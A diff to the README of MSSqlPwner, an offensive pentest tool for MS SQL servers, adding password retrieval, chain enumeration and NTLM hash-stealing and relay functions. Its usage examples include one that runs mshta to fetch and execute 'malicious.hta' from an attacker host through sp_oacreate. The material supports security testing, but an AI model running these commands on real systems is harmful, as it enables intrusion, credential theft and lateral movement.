@@ -24,21 +24,28 @@ This tool is supported by multiple authentication methods and described below.
 This tool is designed for security professionals and researchers for testing purposes only and should not be used for illegal purposes.
 
 ## Functionalities:
-1. Command Execution: Execute commands using the following functions:
-- `xp_cmdshell` on local server or on linked servers
-- `sp_oacreate` (Ole Automation Procedures) on local server or on linked servers
+1. Utilities:
+- `interactive`: allow to use the tool interactively with live execution.
+- `enumerate`: enumerate the linked servers and the chains.
 
-2. NTLM Hash Stealing and Relay: Issue NTLM relay or steal NTLM hashes using the following functions:
-- `xp_dirtree` on local server or on linked servers
-- `xp_subdirs` on local server or on linked servers
-- `xp_fileexist` on local server or on linked servers
+2. Command Execution: Execute commands using the following functions:
+- `xp_cmdshell` Execute commands using `xp_cmdshell` on local server or on linked servers
+- `sp_oacreate` Execute commands using Ole Automation Procedure technique on local server or on linked servers
 
-3. Encapsulated Commands and Queries: Execute incapsulated commands or queries using the following options:
-- `execute_command` on local server or on linked servers
-- `run_query` on local server or on linked servers
-- `run_query_system_service` on local server or on linked servers as system user
-4. Direct Queries 
-- `direct_query` - execute direct queries on local or linked servers as system user.
+3. Password Retrieval:
+- `retrive-password` Password retrieval from the linked server.
+
+4. NTLM Hash Stealing and Relay: Issue NTLM relay or steal NTLM hashes using the following functions:
+- `xp_dirtree` NTLM stealing using directory listing on local server or on linked servers
+- `xp_subdirs` NTLM stealing using subdirectory listing on local server or on linked servers
+- `xp_fileexist` NTLM Stealing using file existence check on local server or on linked servers
+
+5. Procedure execution using custom assembly and stored procedures:
+- `execute_command` procedure executing commands using custom assembly on local server or on linked servers
+- `run_query` procedure executing queries using custom assembly on local server or on linked servers
+- `run_query_system_service` procedure executing queries using custom assembly on local server or on linked servers as system user
+6. Direct Queries 
+- `direct_query` Execute direct queries on local server or on linked servers
 
 
 ## Lateral Movement and Chain Exploration:
@@ -61,7 +68,7 @@ Discover new possibilities for lateral movement, stealthy querying, and precise 
 
 ## Installation
 ```
-git clone https://github.com/El3ct71k/MSSqlPwner
+git clone https://github.com/ScorpionesLabs/MSSqlPwner
 cd MSSqlPwner
 pip3 install -r requirements.txt
 python3 MSSqlPwner.py
@@ -69,6 +76,10 @@ python3 MSSqlPwner.py
 
 ## Usage
 ```
+# Interactive mode
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+
 # Executing custom assembly on the current server with windows authentication and executing hostname command 
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
 
@@ -79,13 +90,16 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server 
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec hostname
 
 # Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec "cmd /c dir \\\\192.168.45.250\\test" -command-execution-method sp_oacreate
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
 
 # Issuing NTLM relay attack on the SRV01 server
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay \\\\192.168.45.250\\test
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 5
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 5 ntlm-relay 192.168.45.250
 
 # Issuing NTLM relay attack on the local server with custom command
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay \\\\192.168.45.250\\test
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 
 # Executing direct query
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query "SELECT CURRENT_USER"
@@ -98,3 +112,4 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server 
 ## Thanks
 - [Kim Dvash](https://www.linkedin.com/in/kim-d-5b3114111) for designing this incredible logo.
 - [Pablo Martínez](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/) for the inspiration and the idea of the retrieving password technique.
+- [Omri Baso](https://www.linkedin.com/in/omri-baso-875aaa191/) for helping with inspiration and ideas.
